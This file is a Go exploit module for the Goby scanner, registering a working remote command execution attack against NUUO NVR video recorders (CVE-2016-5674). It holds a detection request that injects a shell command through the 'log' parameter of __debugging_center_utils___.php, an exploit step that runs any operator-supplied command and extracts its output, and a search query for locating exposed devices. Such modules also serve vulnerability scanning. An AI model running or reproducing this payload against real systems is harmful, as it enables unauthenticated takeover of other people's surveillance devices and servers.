package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "NUUO NVR __debugging_center_utils___.php Command Execution",
    "Description": "<p>The NUUO NVR video storage management device __debugging_center_utils___.php has an unauthorized remote command execution vulnerability. An attacker can execute arbitrary system commands without any permissions, thereby invading the server and obtaining administrator permissions on the server.</p>",
    "Product": "NUUO-NVR",
    "Homepage": "https://www.nuuo.com/ProductNode.php?node=2",
    "DisclosureDate": "2022-06-16",
    "Author": "shuxtmao",
    "FofaQuery": "title=\"Network Video Recorder Login\"",
    "GobyQuery": "title=\"Network Video Recorder Login\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>Upgrade to the latest version</p>",
    "References": [
        "https://fofa.info/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/__debugging_center_utils___.php?log=;echo%20123%20|%20md5sum",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "ba1f2511fc30423bdbb183fe33f3dd0f",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/__debugging_center_utils___.php?log=;{{{cmd}}}",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|/mtd/block4/log/;(?s)(.*)</pre>"
            ]
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2016-5674"
    ],
    "CNNVD": [
        "CNNVD-201608-268"
    ],
    "CNVD": [],
    "CVSSScore": "9",
    "Translation": {
        "CN": {
            "Name": "NUUO NVR 摄像机 __debugging_center_utils___.php 命令执行漏洞",
            "Product": "NUUO-NVR",
            "Description": "<p><span style=\"color: rgba(0, 0, 0, 0.85); font-size: 14px;\"><span style=\"color: rgb(0, 0, 0); font-size: 14px;\">NUUO Network Video Recorder（NVR）是中国台湾NUUO公司的一款网络视频记录器。</span>NUUO NVR视频存储管理设备__debugging_center_utils___.php存在未授权远程命令执行漏洞，攻击者可在没有任何权限的情况下通过log参数执行任意PHP代码，从而入侵服务器，获取服务器的管理员权限。</span><br></p>",
            "Recommendation": "<p>建议升级至最新版本，目前厂商已经发布了升级补丁以修复此安全问题：<a target=\"_Blank\" href=\"http://www.nuuo.com/\">http://www.nuuo.com/</a><br></p>",
            "Impact": "<p>攻击者可以通过log参数，<span style=\"color: rgb(25, 52, 76); font-size: 16px;\">在服务器端任意执行代码，写入后门，</span>从而入侵服务器，获取服务器的管理员权限。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "NUUO NVR __debugging_center_utils___.php Command Execution",
            "Product": "NUUO-NVR",
            "Description": "<p><span style=\"color: var(--primaryFont-color);\">The NUUO NVR video storage management device __debugging_center_utils___.php has an unauthorized remote command execution vulnerability. An attacker can execute arbitrary system commands without any permissions, thereby invading the server and obtaining administrator permissions on the server.</span><br></p>",
            "Recommendation": "<p><span style=\"color: var(--primaryFont-color);\">Upgrade to the latest version</span><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10766"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}